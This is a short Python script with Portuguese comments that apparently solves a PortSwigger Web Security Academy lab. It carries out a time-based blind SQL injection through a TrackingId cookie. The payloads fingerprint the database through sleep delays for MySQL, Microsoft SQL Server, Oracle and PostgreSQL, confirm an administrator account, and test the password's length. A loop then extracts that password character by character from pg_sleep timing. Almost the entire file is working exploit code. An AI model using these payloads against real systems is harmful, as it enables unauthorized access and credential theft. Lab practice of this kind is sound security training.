import requests

# Parâmetro vulnerável: Cookies -> TrackingId

# PAYLOADS
# Descobrindo qual o BD
sqli_1 = "' (SELECT sleep(10))--" # Time delay em MySQL (não funcionou)
sqli_2 = "'+(WAITFOR DELAY '0:0:10')--" # Time delay em Microsoft (não funcionou)
sqli_3 = "'||(dbms_pipe.receive_message(('a'),10))--" # Time delay em Oracle (não funcionou)
sqli_4 = "'||(SELECT pg_sleep(5))--" # Time delay em PostgreSQL (funcionou)
# Ataque
sqli_5 = "'||(CASE WHEN 1=1 THEN (SELECT pg_sleep(10)) END)--" # Time delay e condicional em um PostgreSQL
sqli_6 = "'||(CASE WHEN ((SELECT COUNT(username) FROM users WHERE username = 'administrator') = 1) THEN (SELECT pg_sleep(10)) END)--" # Testando existência do usuário administrator
sqli_7 = "'||(CASE WHEN (LENGTH((SELECT password FROM users WHERE username = 'administrator')) = 20) THEN (SELECT pg_sleep(10)) END)--" # Testando o tamanho da senha do administrator 

url = 'https://0aca005304e822328063122a00650077.web-security-academy.net'
# Request para os payloads de sqli_1 até sqli_7
'''
cookies = {
    'TrackingId': 'rxJAbrClA19rlgZW' + sqli_1,
}
response = requests.get(url, cookies=cookies)

print("time delay: " + str(response.elapsed.total_seconds()) + " s")
'''

# Sequência de requests para o payload sqli_8
caracteres = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']
password = []
for i in range(1,21): # Percorre de 1 a 20
    for j in caracteres:
        # Capturando caracteres da password do administrator 
        sqli_8 = "'||(CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'administrator')," + str(i) + ",1) = '" + j + "') THEN (SELECT pg_sleep(5)) END)--"
        cookies = {
            'TrackingId': 'rxJAbrClA19rlgZW' + sqli_8,
        }
        response = requests.get(url, cookies=cookies)
        if response.elapsed.total_seconds()>5:
            password.append(j)
    
print("Password: " + "".join(password))